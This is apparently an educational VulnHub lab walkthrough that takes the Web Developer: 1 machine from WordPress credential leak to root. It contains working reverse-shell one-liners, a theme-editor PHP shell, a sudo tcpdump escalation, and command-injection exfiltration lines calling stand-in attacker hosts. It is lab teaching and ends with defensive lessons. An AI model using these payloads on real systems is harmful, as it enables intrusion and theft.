# Web Developer: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots below are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | Web Developer: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy / Medium*) |
| **Author** | Fred Wemeijer |
| **Released** | 5 November 2018 |
| **VulnHub Entry** | https://vulnhub.com/entry/web-developer-1,288/ |
| **Download** | https://vulnhub.com/entry/web-developer-1,288/#download (mirror: https://download.vulnhub.com/webdeveloper/WebDeveloper.ova) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu, Apache + PHP + WordPress + MySQL) |

> **Note:** exact versions, file paths, credentials, and the flag string **vary by
> build**. Values shown here match common builds of the downloadable OVA.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target VM's IP address on the lab subnet.
- How to enumerate a web server and discover that it is running WordPress.
- How to use `dirb`/`ffuf` to find hidden files, and why a leaked `.cap` capture
  file can hand you credentials.
- How to use `wpscan` to enumerate WordPress users and plugins.
- Why the WordPress **theme/plugin file editor** is a code-execution sink.
- How to turn leaked credentials into an SSH login and reuse them.
- How a dangerous `sudo tcpdump` rule (`-z` post-rotate command) leads to root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# 1. Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# 2. ARP-scan the whole subnet — fast, uses ARP, lists live hosts.
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.101   08:00:27:1a:2b:3c    PCS Systemtechnik GmbH
```


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Alternative: an nmap ping sweep
sudo nmap -sn 192.168.56.0/24
```

**Target IP:** `192.168.56.101`

![Finding the target host](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

```bash
# All 65,535 TCP ports quickly, then deep service detection on what's open.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 80,22 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Web Developer
```

> **How to read it:**
> - `-p-` scans all ports; `-sV` fingerprints the software; `-sC` runs safe default scripts.
> - Port **80** is our main attack surface (Apache serving a website).
> - Port **22 (SSH)** is open — likely our foothold once we have credentials.
> - On some builds SSH is filtered until later; that's fine.

```bash
# Browse the site and confirm it is WordPress.
curl -s http://192.168.56.101/ | head
```

```text
<title>Web Developer &#8211; Just another WordPress site</title>
<link rel="https://api.w.org/" href="http://192.168.56.101/index.php/wp-json/" />
```

### 2.1 Enumerate users and plugins with wpscan


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/ -e u,ap,at
```

```text
[+] URL: http://192.168.56.101/
[+] WordPress version 4.9.8 identified
[+] Users Identified: webdeveloper  (login: webdeveloper)
```

> **Why it works:** WordPress ships with an author-enumeration weakness — visiting
> `/?author=1` (or the REST API) leaks usernames. `wpscan` automates this and also
> fingerprints installed plugins/themes against a vulnerability database.

### 2.2 Find hidden files with a content brute-force


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
dirb http://192.168.56.101/ /usr/share/wordlists/dirb/common.txt
# or:
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://192.168.56.101/FUZZ -e .txt,.php,.cap,.zip
```

```text
+ http://192.168.56.101/index.php                 (CODE:200)
+ http://192.168.56.101/ipdata/                   (CODE:200)
+ http://192.168.56.101/analyze.cap               (CODE:200)
```

> **Why it works:** Web servers often expose files they never intended to publish.
> Here a network capture (`.cap`) was left in the web root. Directories like
> `/ipdata/` also show up; always enumerate file **extensions** too.

```bash
# Download the leaked packet capture.
wget http://192.168.56.101/analyze.cap
```

```text
analyze.cap   100%[==================>]  14.21K
```

![Directory/file enumeration result](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Recover credentials from the leaked capture

The `.cap` file is a packet capture of HTTP traffic. Open it with Wireshark, or
carve the strings out from the terminal:

```bash
# Non-interactive: pull POST bodies out of the capture and look for a login form.
tshark -r analyze.cap -Y "http.request.method == POST" \
       -T fields -e http.file_data
```

```text
log=webdeveloper&pwd=Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd&wp-submit=Log+In
```

> **Why it works:** This capture was made over plain **HTTP** (no TLS), so the
> WordPress login request — including the password — is fully readable. The values
> are URL-encoded, so decode them: `%26`→`&`, `%21`→`!`, `%24`→`$`, `%29`→`)`,
> `%25`→`%`, `%28`→`(`.

```text
Username: webdeveloper
Password: Te5eQg&4sBS!Yr$)wf%(DcAd
```

> **In Wireshark (GUI):** right-click the relevant packet → **Follow → TCP Stream**,
> then read the `log=` and `pwd=` fields.

![Wireshark: credentials from the HTTP stream](images/03b-wireshark.png)

### 3.2 Log in to the WordPress admin panel

Browse to `http://192.168.56.101/wp-login.php` and log in with the recovered
credentials. You now land in the WordPress dashboard as an **administrator**.

```text
http://192.168.56.101/wp-login.php
Username: webdeveloper
Password: Te5eQg&4sBS!Yr$)wf%(DcAd
```

> **Why it works:** Administrative access to WordPress is effectively web-shell
> access, because the theme/plugin editors let you write arbitrary PHP.

### 3.3 Get code execution via the theme editor

1. Go to **Appearance → Themes** and activate a theme you can edit (in this build
   the *active* theme's files are locked; switch to another, e.g. **Twenty Fifteen**).
2. Open **Appearance → Editor**, select a template such as **404.php**.
3. Replace its contents with a PHP reverse shell (Kali ships one):
   `/usr/share/webshells/php/php-reverse-shell.php`.
4. Edit the `$ip` and `$port` inside it to your Kali box:

```php
$ip = '192.168.56.10';   // your Kali IP
$port = 4444;            // your listener port
```


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali, start the listener FIRST.
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

5. Trigger it by requesting a **non-existent** post so WordPress loads `404.php`:

```bash
curl "http://192.168.56.101/index.php/2018/10/30/anything"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 53348
Linux webdeveloper 4.15.0-38-generic x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** WordPress renders the theme's `404.php` for unknown URLs, so
> editing that file (as an admin) and requesting a bad URL runs **your** PHP with
> the web server's privileges (`www-data`).

> **Alternative path (also valid):** install the vulnerable **ReFlex Gallery**
> plugin, then use Metasploit's `exploit/unix/webapp/wp_reflexgallery_file_upload`.
> Or edit any editable plugin file (some builds allow editing `akismet/index.php`)
> and hit it as `.../index.php?cmd=id`.

### 3.4 Upgrade the shell to a full TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 3.5 Read the web config — and reuse the password


> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)

```bash
cd /var/www/html
cat wp-config.php | grep -i -E 'DB_USER|DB_PASSWORD'
```

```text
define('DB_USER', 'webdeveloper');
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

> **Why it works:** `wp-config.php` stores the database credentials in plaintext.
> Password reuse is extremely common — the same account often exists on the OS.

```bash
# Try those details over SSH.
ssh webdeveloper@192.168.56.101
# password: MasterOfTheUniverse
```

```text
webdeveloper@webdeveloper:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper)
```

```bash
cat ~/user.txt 2>/dev/null || find / -name "user.txt" 2>/dev/null
```

```text
<user flag — varies by build>
```

![Shell as www-data / SSH as webdeveloper](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Enumerate sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

> **Why it works:** `webdeveloper` may run `tcpdump` as **root** with no password.
> `tcpdump` supports `-z <command>`, a *post-rotate* hook that runs a program
> **after each rotation** — and that program runs as root because tcpdump is root.

### 4.2 Abuse `tcpdump -z` to run a root command

`tcpdump`'s `-z` runs the file only when a rotation happens, and `-G 1` rotates
every 1 second, so we start a capture and generate a little traffic.


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# Command we want to run as root.
COMMAND='cat /root/flag.txt'            # or: /bin/bash -i >& /dev/tcp/192.168.56.10/5555 0>&1
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF

# -z runs $TF as root; -Z root makes tcpdump keep root privileges.
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z "$TF" -Z root
```

```bash
# In a second terminal / our web shell, generate traffic so a rotation fires:
curl http://127.0.0.1/ >/dev/null
# or: ping -c1 127.0.0.1
```

For a clean root shell instead of a one-shot command, use an interactive payload:

```bash
COMMAND='/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.10/5555 0>&1"'
TF=$(mktemp); echo "$COMMAND" > $TF; chmod +x $TF
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z "$TF" -Z root
# On Kali: nc -lvnp 5555
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `-z` executes a program as a *side effect* of capturing
> traffic. Because `tcpdump` is run via sudo, the side-effect program executes as
> root. This is the classic "GTFOBins" technique for `tcpdump`.

![Privilege escalation to root](images/07-privesc.png)

### 4.3 The root flag

```bash
cat /root/flag.txt
```

```text
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290    <-- varies by build
```

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive file exposed in web root | `http://target/analyze.cap` | Leaks admin credentials from a plaintext HTTP capture |
| 2 | Credentials sent over unencrypted HTTP | WordPress `wp-login.php` | Password recovery from network capture |
| 3 | Weak/locked WordPress users + admin file editor | `wp-login.php`, Appearance → Editor | Authenticated PHP code execution → `www-data` shell |
| 4 | Plaintext DB credentials in config | `/var/www/html/wp-config.php` | Credential reuse → OS user `webdeveloper` |
| 5 | Dangerous `sudo` rule | `(root) /usr/sbin/tcpdump` | `tcpdump -z` post-rotate command runs as root → full root |

---

## 6. Defensive lessons (blue team)

- **Never serve capture/backup files from the web root.** Keep `.cap`, `.zip`,
  `.env`, `.bak` files out of the document root; block them at the proxy/WAF.
- **Enforce HTTPS everywhere.** A TLS-only login makes a leaked capture useless;
  also HSTS and secure cookies.
- **Harden WordPress:** disable the built-in theme/plugin file editor with
  `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`, and drop `FILE_MODS`.
- **Follow least privilege:** the web process should not be able to write to
  theme/plugin files; set files read-only and use a deploy pipeline instead.
- **Brute-force protection:** rate-limit/captcha `wp-login.php`, and enforce MFA;
  use a login-lockout plugin.
- **Secrets management:** do not store plaintext DB passwords in `wp-config.php`.
  Use secrets files with restrictive permissions and rotate them.
- **Sudo hygiene:** never allow interpreters or tools with command hooks
  (`tcpdump`, `vim`, `find`, `awk`, etc.) via sudo unless absolutely required —
  check GTFOBins before granting.
- **Detection opportunities:** alert on `wp-login.php` POSTs with unusual user
  agents, on outbound connections from `www-data`, and on `sudo tcpdump -z`
  invocations. Ship `auth.log`, Apache logs, and auditd to a SIEM.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry (download + author notes): https://vulnhub.com/entry/web-developer-1,288/
- Hacking Articles — Web Developer 1 walkthrough: https://www.hackingarticles.in/web-developer-1-vulnhub-lab-walkthrough/
